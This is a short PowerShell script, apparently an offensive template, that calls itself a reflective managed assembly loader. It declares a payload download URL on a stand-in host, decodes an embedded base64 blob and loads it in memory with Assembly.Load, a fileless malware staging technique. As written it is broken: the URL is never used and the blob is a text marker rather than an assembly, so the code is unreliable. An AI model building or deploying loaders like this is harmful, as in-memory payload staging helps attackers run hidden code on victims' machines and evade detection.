<#
.SYNOPSIS
    Reflective managed assembly loader.

.DESCRIPTION
    Obtains a managed payload stage, loads it into the current
    AppDomain and inspects the exported type count.

.EXAMPLE
    PS> .\loader.ps1
#>
[CmdletBinding()]
param(
    [string]$FetchUrl = 'https://198.51.100.30:8443/payload.bin',
    [int]$TimeoutSec = 10
)
$ErrorActionPreference = "Stop"

$AssemblyBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjpzdWN4ZjdxbmQ1')
Write-Verbose ("Assembly byte count: " + $AssemblyBytes.Length)
$StageResult = [Reflection.Assembly]::Load($AssemblyBytes)
if ($null -ne $StageResult) {
    Write-Verbose ("Loaded assembly: " + $StageResult.FullName)
}

Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
Start-Sleep -Seconds 2
